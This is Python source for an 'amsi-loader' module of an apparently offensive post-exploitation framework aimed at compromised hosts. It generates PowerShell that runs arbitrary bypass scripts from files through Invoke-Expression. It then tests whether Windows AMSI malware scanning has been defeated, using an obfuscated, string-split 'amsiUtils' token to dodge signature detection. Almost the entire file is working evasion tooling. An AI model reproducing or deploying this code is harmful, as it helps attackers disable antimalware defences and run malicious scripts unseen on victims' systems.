from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "amsi-loader",
                       "Description": "AMSI bypass script loader",
                       "Author": "@pilarclares"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "directory": [None, "Directory with the bypass files", False],
                   "files": [None, "Bypass files", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function loader {
            param (
                [string]$directory,
                [string[]]$files
            )

            if (-not $directory -and -not $files) {
                return "At least one of the parameters `$directory or `$files must be provided."
            }

            if ($directory) {
                if (-Not (Test-Path $directory)) {
                    return "The directory $directory does not exist."
                }

                $files = Get-ChildItem -Path $directory -Recurse -File | Select-Object -ExpandProperty FullName
            }

            foreach ($filePath in $files) {
                if (-Not (Test-Path $filePath)) {
                    return "The file $filePath does not exist."
                }

                try{
                    $content = Get-Content -Path $filePath -Raw
                    Invoke-Expression $content -ErrorAction Stop | Out-Null
                } catch {
                    Write-Host "Error executing commands from the file $filePath."
                    throw $_.Exception
                }
            }

            try {
                $command = 'am' + 's' + 'I' + 'u' + 'TI' + 'l' + 's'

                Invoke-Expression $command -ErrorAction Stop | Out-Null

                return "Success: AMSI bypassed successfully."

            } catch {
                if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
                    return "Error: AMSI is still active."
                } else {
                    return "Success: AMSI bypassed successfully."
                }
            }
        }
        """
        function += 'loader'

        if self.args["directory"]:
            function += f' -directory {self.args["directory"]}'
        elif self.args["files"]:
            file_paths = [path.strip() for path in self.args["files"].split(',')]
            files_parameter = ', '.join(f"'{path}'" for path in file_paths)
            function += f' -files @({files_parameter})'

        super(CustomModule, self).run(function)